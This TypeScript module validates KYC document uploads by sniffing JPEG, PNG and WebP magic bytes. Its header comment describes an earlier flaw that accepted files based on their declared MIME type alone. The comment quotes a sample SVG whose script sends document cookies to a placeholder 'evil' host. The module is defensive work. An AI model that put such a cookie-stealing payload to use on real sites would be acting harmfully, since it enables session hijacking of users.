/**
 * Magic-byte identification for uploaded imagery (D2/D4).
 *
 * ⚠️ WHY THIS EXISTS. Until 2026-07-31 the KYC upload path trusted the mime type
 * written in the data URL — a string the CLIENT supplies. `validateDocImage` tested
 * `^data:image/(jpeg|png|webp);base64,` and the decoded SIZE, and nothing else.
 * Driven with real files, every one of these was ACCEPTED as an identity document:
 *
 *   · a Windows executable (real PE `MZ` header) declared image/jpeg
 *   · an SVG carrying <script>fetch('https://evil/'+document.cookie)</script>
 *     declared image/png
 *   · the outer bytes of a zip declared image/webp
 *   · raw HTML with a <script> tag declared image/jpeg
 *
 * For a licensed operator the compliance failure lands before the security one: a
 * KYC document that is not an image is not evidence, and an officer approving
 * against it has approved against nothing. The bytes also land in R2 and in every
 * nightly backup.
 *
 * So: identify the format from the BYTES, and require the declared type to match.
 */

/** Byte signatures for the three formats the KYC uploader accepts. */
const SIGNATURES: ReadonlyArray<{ mime: string; matches: (b: Buffer) => boolean }> = [
  // JPEG — SOI marker FF D8, then the start of any marker segment (FF).
  { mime: "image/jpeg", matches: (b) => b.length >= 3 && b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff },
  // PNG — the 8-byte signature, including the CRLF/EOF transfer-corruption probes.
  { mime: "image/png", matches: (b) => b.length >= 8 && b.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])) },
  // WebP — RIFF container whose form type is WEBP (bytes 8..12).
  { mime: "image/webp", matches: (b) => b.length >= 12 && b.subarray(0, 4).toString("latin1") === "RIFF" && b.subarray(8, 12).toString("latin1") === "WEBP" },
];

/** How many decoded bytes are needed to identify any supported format. */
export const SIGNATURE_BYTES = 12;

/** The format these bytes ACTUALLY are, or null if not a supported image. */
export function sniffImageMime(head: Buffer): string | null {
  for (const s of SIGNATURES) if (s.matches(head)) return s.mime;
  return null;
}

/**
 * Decode just enough of a base64 payload to identify it. Decoding only the head
 * keeps a 3 MB upload from being materialised twice purely to read 12 bytes.
 */
export function sniffBase64ImageMime(b64: string): string | null {
  // 4 base64 chars → 3 bytes; take a whole number of quartets.
  const quartets = Math.ceil(SIGNATURE_BYTES / 3);
  return sniffImageMime(Buffer.from(b64.slice(0, quartets * 4), "base64"));
}
